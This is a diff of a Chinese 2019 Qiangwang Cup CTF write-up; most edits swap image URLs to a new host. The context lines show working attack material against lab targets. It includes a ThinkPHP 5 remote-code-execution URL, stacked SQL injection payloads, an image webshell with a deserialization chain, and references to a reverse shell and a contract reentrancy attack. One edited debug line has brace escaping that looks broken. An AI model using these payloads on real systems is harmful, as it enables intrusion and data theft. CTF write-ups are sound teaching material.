@@ -1,5 +1,5 @@
 # 2019强网杯
-本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
+本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://ctfwp.wetolink.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
 ## 题目类型：
 |类型|年份|难度|
 |:---:|:---:|:---:|
@@ -34,49 +34,49 @@
 
 1.先打开靶机看看。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588315116632a22379b951bd03488e1f540824a3-1024x610.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/0.png)
 
 2.看起来是个登录和注册页面，那么就先注册然后登录试试吧。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316155ab45b21322b64c03cfbd8142644d0aa-874x1024.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/1.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883162455655488de7893bff5614210c25c7f7c.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/2.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316482c048c42c816c7619e902ba7ad6a2b3d-926x1024.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/3.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316607f0bbaeaad2bb13fedf5a1259baf95b8.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/4.png)
 
 3.登录之后看到这样一个页面，测了一下只能上传能被正常查看的 png。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883185208dd35b4766dc02ee91983d15ec3f94f-1024x687.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/5.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588318636c3e97cf680f218d022c876c0e8e148b.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/6.png)
 
 4.跳转到了一个新的页面，这个页面似乎没有任何实际功能了。然后可以看到我们图片是正确被上传到服务器上的 /upload/da5703ef349c8b4ca65880a05514ff89/ 下了。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588318903e74b4fc7850d13dde50cb1d8ab12301-1024x570.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/7.png)
 
 5.然后我们来扫扫敏感文件，发现 `/www.tar.gz` 下有内容（其实是从第二题得到的提示），下载下来解压看看，发现是 ThinkPHP 5 框架写的。
 
 www.tar.gz[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15588320959d0a5958211037910e55ab9d4a45ccc1.gz)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832218cad9f782eda9b653f9e195efc63cf59a-1024x613.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/8.png)
 
 6.而且其有 .idea 目录，我们将其导入到 PHPStorm 看看吧。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832287668bb7a6a66e7968ff875b7a84d2b813-1024x626.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/9.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832287668bb7a6a66e7968ff875b7a84d2b813.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/10.png)
 
 7.发现其在 `application/web/controller/Register.php` 和 `application/web/controller/Index.php` 下有两个断点，很诡异，估计是 Hint 了。
 
 application/web/controller/Register.php：
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832405f820b22bee73719de7d597b312004cd2.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/11.png)
 
 application/web/controller/Index.php：
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588323518efcf869541b8638db34f86a0fed9622-1024x303.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/12.png)
 
 8.看了看，发现这两个点的流程大概如下。
 
@@ -92,13 +92,13 @@ Register 的析构方法，估计是想判断注没注册，没注册的给调�
 
 9.然后再来审一下其他代码，发现上传图片的主要逻辑在 `application/web/controller/Profile.php` 里。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832931289f7b7dd7dca7839b5bac4f0835ac0e-1024x572.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/13.png)
 
 先检查是否登录，然后判断是否有文件，然后获取后缀，解析图片判断是否为正常图片，再从临时文件拷贝到目标路径。
 
 而 Profile 有 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883378645e1badb77713a21a54e9696f5a738dd-1024x626.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/14.png)
 
 看起来似乎天衣无缝。
 
@@ -106,15 +106,15 @@ Register 的析构方法，估计是想判断注没注册，没注册的给调�
 
 11.首先用蚁剑生成个马，再用 hex  编辑器构造个图片马，注册个新号上传上去。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588333581865d65bcc00cad9fab6156cd2d24b6b-1024x688.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/15.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883342647b20e3e79d8a790485cdde46ac35e1b-1024x647.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/16.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558833505be82461dd72b9f059ba85653fb4cec53-1024x601.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/17.png)
 
 12.然后构造一个 Profile 和 Register 类，命名空间 app\web\controller（要不然反序列化会出错，不知道对象实例化的是哪个类）。然后给其 except 成员变量赋值 ['index' =&gt; 'img']，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558834087d842ce0a929a743be2662806866a0a39-1024x629.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/18.png)
 
 而后我们又赋值控制 filename_tmp 和 filename 成员变量。可以看到前面两个判断我们只要不赋值和不上传变量即可轻松绕过。ext 这里也要赋值，让他进这个判断。而后程序就开始把  filename_tmp 移动到 filename，这样我们就可以把 png 移动为 php 文件了。
 
@@ -187,21 +187,21 @@ TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFw
 
 15.然后置 coookie。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558834498e3c796623859fe12a523e3fea49af8ab-1024x784.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/19.png)
 
 16.刷新页面。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588345217ba8d594e1161251c60db4e34f763b17-1024x555.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/20.png)
 
 17.可以看到我们的小马已经能访问了。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883455117b71285b8a3392e8233c7de7311cde3-1024x411.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/21.png)
 
 18.然后蚁剑连上，打开 /flag 文件。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588346181bd8fa356b22e840d4296f217666ebe8-1024x688.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/22.png)
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588346387ab9fa88b0dc076a1d83a02110c62ea1-1024x688.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/23.png)
 
 19.Flag 到手~
 
@@ -213,7 +213,7 @@ TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFw
 
 1.打开靶机，是这样一个页面。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835272fd70292e56dc92e7b063263780c6de81-1024x211.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/24.png)
 
 2.那就下载源码吧。
 
@@ -221,19 +221,19 @@ TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFw
 
 3.来看看，发现大部分文件都是一些垃圾代码，难以解读。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835400d75a27d6992ead8e8723ec35a14a740d-1024x804.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/25.png)
 
 但有些地方是能看的，比如
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883542371663e53d48fb28b5574ca913ba4c2ed.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/26.png)
 
 前头赋值，神仙难救。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835445834b884adfc23e438c0e0724130e10a2.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/27.png)
 
 神仙难救。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835627a0a378ce6daac5a406ae906c738b21d7.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/28.png)
 
 神仙难救。
 
@@ -333,19 +333,19 @@ for file in files:  # 遍历文件夹
 
 > /usr/bin/php -S localhost:11180 -t /Users/jinzhao/PhpstormProjects/qwb
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835730ae911ad0e232535244aa4161081c6092-1024x191.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/29.png)
 
 6.运行脚本，开扫，扫到一个咯~
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835861a07aab06b0dd3c5c0ca5f0d6941a721e-1024x128.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/30.png)
 
 7.去这个文件里看看。这一段是关键，拼接了一个 System  出来调用 Efa5BVG 这个参数。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835902b176094d2d7d236cc96ffe305e6e5d32-1024x346.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/31.png)
 
 8.OK，那么就来试试读取 flag 吧。访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588359964fd8d1dc8b2264e7eedaedb29fd8f327-1024x133.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/32.png)
 
 9. Flag 到手~
 
@@ -355,21 +355,21 @@ for file in files:  # 遍历文件夹
 
 1.打开靶机，发现似乎可以遍历目录。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588630365222ff84e669c9f4d67603d9182e1cce.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/33.png)
 
 2.点进去看看，似乎是 ThinkPHP。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558863068360f8c91911146043d6ef94e04754fb9.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/34.png)
 
 3.看看 Readme，似乎是 ThinkPHP 5.0?
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558863271a0280aefb5cf6d17d0bb028cdb021ced-1024x855.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/35.png)
 
 4.直接上次去防灾打比赛的 payload 一把梭。
 
 `/1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag`
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155886333377c0f22d589fc77be54e46e40d55a34f-1024x100.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/36.png)
 
 5. Flag 到手~
 
@@ -381,22 +381,22 @@ for file in files:  # 遍历文件夹
 
 1.打开靶机，发现是这样一个页面。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588772236949e6ef54f82dbde3dc40ff3881b530-1024x239.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/37.png)
 
 2.然后提交试试。发现似乎是直接把返回的原始数据给返回了。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155887735899e0ead8aeecbbcfbb05d29796da4dff-1024x412.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/38.png)
 
 3.然后来测试一下有没有注入，似乎是有的。
 
 `/?inject=1%27or+%271%27%3D%271
 /?inject=1' or '1'='1`
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558877587d94b7f6fde49a61ec1cb2bdd929e7122-1024x753.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/39.png)
 
 4.来检查一下过滤情况，过滤函数如下。
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/155887769840011b0dcc021be32d8fb64955e080b1-1024x221.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/40.png)
 
 过滤了 select，update，delete，drop，insert，where 和 点。
 
@@ -407,28 +407,28 @@ for file in files:  # 遍历文件夹
 /?inject=222';show databases;#
 ```
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558877945ef512666a7f31f73119a0a6bb253e24c-1024x588.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/41.png)
 
 6. OK,可以。那看看有啥表。
 
 `/?inject=222%27%3Bshow+tables%3B%23
 /?inject=222';show tables;#`
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878266092f2e11111c57946135801d4c4d75da-1024x505.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/42.png)
 
 7.来看看这个数字为名字的表里有啥。看来 flag 在这了。
 
 `/?inject=222%27%3Bshow+columns%20from%20`1919810931114514`%3B%23
 /?inject=222';show columns from `1919810931114514`;#`
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878322f559521d405818004e5652567e90cde5-1024x639.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/43.png)
 
 8.然后是 words 表，看起来就是默认查询的表了。
 
 `/?inject=222%27%3Bshow+columns%20from%20`words`%3B%23
 /?inject=222';show columns from `words`;#`
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588784806bdfdf08f05e3715a7e20cb70c5dc706-1024x910.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/44.png)
 
 9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
 
@@ -445,14 +445,14 @@ for file in files:  # 遍历文件夹
 /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#`
 ```
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878854cebb31f09962fa4807dd9846d0df86e8-1024x821.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/45.png)
 
 11.用 `1' or '1'='1 `访问一下。
 
 `/?inject=1%27+or+%271%27%3D%271#
 /?inject=1' or '1'='1
 
-![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588789483e5ae94244cef60da3688fab16d8502b-1024x387.png)
+![](https://ctfwp.wetolink.com/2019qiangwang/46.png)
 
 12. Flag 到手~
 
@@ -731,7 +731,7 @@ if __name__ == '__main__':
 
 找到
 
-![](https://p.pstatp.com/origin/fe7d0000cef87e94f9ab)
+![](https://ctfwp.wetolink.com/2019qiangwang/65.jpeg)
 
 域名绑定到hosts，就可以访问了，后来才知道,本题nginx做代理时，是与域名绑定的。
 结合一开始发现的rsync的未授权访问获取的源码
@@ -753,17 +753,17 @@ print(base64.b64decode(r.content))
 ```
 可以发现发现
 
-![](https://p.pstatp.com/origin/fffc00001b3252e6e2f2)
+![](https://ctfwp.wetolink.com/2019qiangwang/66.jpeg)
 
 存在uwsgi
 
 用uwsgi的命令执行脚本进行修改，将gopher语句输出后，通过ssrf打127.0.0.1:3031
 
-![](https://p.pstatp.com/origin/ff9a000082a248bd1225)
+![](https://ctfwp.wetolink.com/2019qiangwang/67.jpeg)
 
 成功反弹shell
 
-![](https://p.pstatp.com/origin/fee3000039417746fc6f)
+![](https://ctfwp.wetolink.com/2019qiangwang/68.jpeg)
 
 根据提示socks5，通过扫描发现172.16.17.4开发1080端口。在内网机器上使用ew进行代理
 
@@ -775,24 +775,24 @@ print(base64.b64decode(r.content))
 
 通过反代出来的socks5进内网
 
-![](https://p.pstatp.com/origin/fea5000063baeb6ff06b)
+![](https://ctfwp.wetolink.com/2019qiangwang/69.jpeg)
 
 代码审计给出的代码https://paste.ubuntu.com/p/q4xJBfm3Bb/
 
-![](https://p.pstatp.com/origin/dc0b0006364e12a090d1)
+![](https://ctfwp.wetolink.com/2019qiangwang/70.jpeg)
 
 回溯func waf
 
-![](https://p.pstatp.com/origin/dc0e0002ddfc05d14bf1)
+![](https://ctfwp.wetolink.com/2019qiangwang/71.jpeg)
 
 log记录数据
 
-![](https://p.pstatp.com/origin/ff4d000053d013b9c22b)
+![](https://ctfwp.wetolink.com/2019qiangwang/72.png)
 
 存在任意文件写
 回溯saveall
 
-![](https://p.pstatp.com/origin/feff00003de1012b10d3)
+![](https://ctfwp.wetolink.com/2019qiangwang/73.jpeg)
 
 同时session类里有调用了pickle.load，因此存在反序列化
 
@@ -860,7 +860,7 @@ game.gb（附件）应该就是游戏了，下载下来，百度搜了一下是G
 ### 强网先锋-打野
 附件下载后直接通过zsteg解
 
-![](https://p.pstatp.com/origin/ffc7000027066e11d9a3)
+![](https://ctfwp.wetolink.com/2019qiangwang/80.jpeg)
 
 ## Crypto
 
@@ -869,9 +869,9 @@ game.gb（附件）应该就是游戏了，下载下来，百度搜了一下是G
 
 第二层，分析 SDK的 Random 函数。
 
-![](https://p.pstatp.com/origin/ff3a00001e8ecae73140)
+![](https://ctfwp.wetolink.com/2019qiangwang/81.png)
 
-![](https://p.pstatp.com/origin/fe2a0000b18830fb3493)
+![](https://ctfwp.wetolink.com/2019qiangwang/82.png)
 
 随机数是以 `seed0x5deece66d + 0xb &((1<<48)-1)` 循环的形式生成伪随机数的，只需要爆破得到低16位即可 就是 `0-0xffff`。
 
@@ -1029,7 +1029,7 @@ attack()
 ### BABYBANK
 我们通过合约地址进行逆向得到合约的逆向代码(https://ethervm.io/decompile/)
 
-![](https://p.pstatp.com/origin/ff1a0000325aa8535915)
+![](https://ctfwp.wetolink.com/2019qiangwang/83.jpeg)
 
 由代码分析我们得出代码中的关键函数分别为：guess、profit、transfer、withdraw。 且合约中存在两个关键变量：balance（余额）以及level（一种标记）。
 
@@ -1045,7 +1045,7 @@ withdraw函数表示取款，且合约会将以太币转给msg.sender。
 
 于是我们利用此来进行攻击。我们还看到withdraw中还存在如下方法：
 
-![](https://p.pstatp.com/origin/dc110001bcf601941da9)
+![](https://ctfwp.wetolink.com/2019qiangwang/84.jpeg)
 
 当存在减法且没有判断时，我们就可以认定这里存在溢出，然而要满足溢出条件需要storage[temp2]<temp1。可是前面代码加了判断，所以我们需要在中间调用.call时进行对余额的操作从而让其减小。 我们可以在合约调用如下句子的时候调用收款人的fallback函数从而再次执行withdraw，加入合约余额为2，转账金额设置为2。而在中间进行调用可以很好的绕过余额的检测，从而达成2-2-2的情况，从而溢出。
 
@@ -1086,7 +1086,7 @@ contract hack{
 }
 ```
 
-![](https://p.pstatp.com/origin/1372f0000096f60559332)
+![](https://ctfwp.wetolink.com/2019qiangwang/85.jpeg)
 
 + 1 由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。
 + 2 进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。
@@ -1094,11 +1094,11 @@ contract hack{
 
 PS：由于合约需要前四位为“b1b1”的账户，所以我们需要https://vanity-eth.tk/来生成相应的账户B。
 
-![](https://p.pstatp.com/origin/ffd7000024c4f3d3c8d9)
+![](https://ctfwp.wetolink.com/2019qiangwang/86.jpeg)
 
 调动成功后在邮箱收到flag
 
-![](https://p.pstatp.com/origin/dc0f0002c9aa78189400)
+![](https://ctfwp.wetolink.com/2019qiangwang/87.jpeg)
 
 
 ### babybet
@@ -1170,13 +1170,13 @@ function ffff() public {
 ```
 每次生成新合约，循环20次，所以此合约执行50次即可。记得将gas limit调大。 预测十分简单，即使用一下语句即可
 
-![](https://p.pstatp.com/origin/fe4e0000aff3baa804ac)
+![](https://ctfwp.wetolink.com/2019qiangwang/88.jpeg)
 
-![](https://p.pstatp.com/origin/fe2f00007632ad0c0539)
+![](https://ctfwp.wetolink.com/2019qiangwang/89.jpeg)
 
 调用后拿到flag
 
-![](https://p.pstatp.com/origin/ff270000714e9408fa68)
+![](https://ctfwp.wetolink.com/2019qiangwang/90.jpeg)
 
 ### 强网先锋-辅助
 
@@ -1784,7 +1784,7 @@ ret2syscall的拟态版本，通过add sp，把32和64区分开，然后分别ro
 + flag拿到后还有个异或操作，就很简单了
 
 
-![](https://p.pstatp.com/origin/ff1e000047ec450602b9)
+![](https://ctfwp.wetolink.com/2019qiangwang/104.jpeg)
 
 ```
 #-*- coding: utf-8 -*-
@@ -1916,7 +1916,7 @@ def dbg(breakpoint):
     gdbscript += 'directory %sstdio-common/\n' % glibc_dir
     gdbscript += 'directory %sstdlib/\n' % glibc_dir
     gdbscript += 'directory %slibio\n' % glibc_dir
-    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
+    elf_base = int(os.popen('pmap {}| awk \x27{\{print \x241}\}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdbscript += 'c\nvis_heap_chunks 0x555555758000 20\ndqs 0x555555554000+0x203168\ndq 0x555555554000+0x203180 30'
     log.info(gdbscript)
@@ -2007,7 +2007,7 @@ if __name__ == '__main__':
 ### JustRe
 第一部分：
 
-![](https://p.pstatp.com/origin/fe7b000075a50006aa5b)
+![](https://ctfwp.wetolink.com/2019qiangwang/105.png)
 
 两端执行相同操作，看其中一个即可。
 
@@ -2044,7 +2044,7 @@ print hex(int(str(m[f1])))[2:], hex(int(str(m[f2])))[2:]
 第二部分
 密钥为 "AFSAFCEDYCXCXACNDFKDCQXC" 的3des算法。直接算即可
 
-![](https://p.pstatp.com/origin/fef3000067882577398f)
+![](https://ctfwp.wetolink.com/2019qiangwang/106.png)
 
 ```
 from Crypto.Cipher import DES3
@@ -2107,7 +2107,7 @@ Ida打开看到程序逻辑只有一个加密函数，
 
 将密文提出来后解密一下就行
 
-![](https://p.pstatp.com/origin/fe2d0000a1e8c19b6e8d)
+![](https://ctfwp.wetolink.com/2019qiangwang/107.jpeg)
 
 Flag:
 
@@ -2115,6 +2115,6 @@ Flag:
 
 # 评论区
 **请文明评论，禁止广告**
-<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  
+<img src="https://ctfwp.wetolink.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  
 
 ---
